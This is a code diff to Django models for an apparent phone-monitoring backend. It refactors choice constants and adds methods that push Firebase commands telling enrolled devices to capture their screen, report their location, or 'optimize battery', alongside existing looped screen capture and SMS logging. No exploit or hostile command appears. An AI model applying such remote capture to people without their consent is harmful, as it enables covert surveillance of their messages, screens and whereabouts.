@@ -6,30 +6,13 @@ import binascii
 import os
 from django.utils.translation import gettext_lazy as _
 from firebase_admin import credentials, messaging
+from . import constants
 
-
-TYPE_LOG = (
-    ('sms', _('SMS')),
-    ('capture', _('Capture screen')),
-    ('location', _('Get Location')),
-    ('optimize', _('Optimize Battery'))
-)
-TYPE_ACTIVITY = (
-    ('capture_loop', _('Loop capture')),
-    ('capture', _('Capture screen')),
-    ('location', _('Get Location')),
-    ('optimize', _('Optimize Battery'))
-)
-GENDER = (
-    ('male', _('Male')), 
-    ('female', _('Female')), 
-    ('unknow', _('Unknow'))
-)
 
 class Account(models.Model):
     user        = models.OneToOneField(User, on_delete=models.CASCADE)
     birthday    = models.DateField(null=True, blank=True, verbose_name=_("Birthday"))
-    gender      = models.CharField(max_length=6, choices=GENDER, verbose_name=_("Gender"))
+    gender      = models.CharField(max_length=6, choices=constants.GENDER, verbose_name=_("Gender"))
     bio         = models.TextField(null=True, blank=True, verbose_name=_("Bio"))
     avatar      = models.ImageField(upload_to='avatar/', null=True, blank=True)
 
@@ -74,6 +57,7 @@ class Device(models.Model):
             )
         return super().save(*args, **kwargs)
     
+    # To send a request to capture device screen continuously
     def loop_capture(self, is_loop_capture):
         message = messaging.MulticastMessage(
           data={
@@ -87,13 +71,38 @@ class Device(models.Model):
         self.is_interval = is_loop_capture
         self.save()
     
+    # To send a request to capture device screen
+    def capture_screen(self):
+        message = messaging.MulticastMessage(
+          data={'type': '1'},
+          tokens=[self.token]
+        )
+        messaging.send_multicast(message)
+    
+    # To send a request to get device location
+    def get_location(self):
+        message = messaging.MulticastMessage(
+          data={'type': '2'},
+          tokens=[self.token]
+        )
+        messaging.send_multicast(message)
+
+    # To send a request to optimize device battery
+    def optimize_battery(self):
+        message = messaging.MulticastMessage(
+          data={'type': '3'},
+          tokens=[self.token]
+        )
+        messaging.send_multicast(message)
+    
+    
 
 # Device logs
 class DeviceLog(models.Model):
     id          = models.BigAutoField(primary_key=True)
     application = models.ForeignKey(Application, on_delete=models.SET_NULL, null=True, blank=True, verbose_name=_("Application"))
     device      = models.ForeignKey(Device, on_delete=models.CASCADE, null=True, verbose_name=_("Device"))
-    type        = models.CharField(max_length=8, choices=TYPE_LOG, default='sms', verbose_name=_("Type")) 
+    type        = models.CharField(max_length=8, choices=constants.TYPE_LOG, default='sms', verbose_name=_("Type")) 
     message     = models.TextField(null=True, blank=True, verbose_name=_("Message"))
     image       = models.ImageField(null=True, blank=True, upload_to='images/', verbose_name=_("Image"))
     created_at  = models.DateTimeField(auto_now_add=True, null=True, verbose_name=_("Created at"))
@@ -109,7 +118,7 @@ class DeviceLog(models.Model):
 class DeviceActivity(models.Model):
     id          = models.BigAutoField(primary_key=True)
     device      = models.ForeignKey(Device, on_delete=models.SET_NULL, null=True, verbose_name=_("Device"))
-    type        = models.CharField(max_length=12, choices=TYPE_ACTIVITY, default='sms', verbose_name=_("Type"))
+    type        = models.CharField(max_length=12, choices=constants.TYPE_ACTIVITY, default='sms', verbose_name=_("Type"))
     log         = models.TextField(null=True, blank=True, verbose_name=_("Log"))
     created_at  = models.DateTimeField(auto_now_add=True, null=True, verbose_name=_("Created at"))
     created_by  = models.ForeignKey(User, on_delete=models.CASCADE, null=True, verbose_name=_("Created by"))
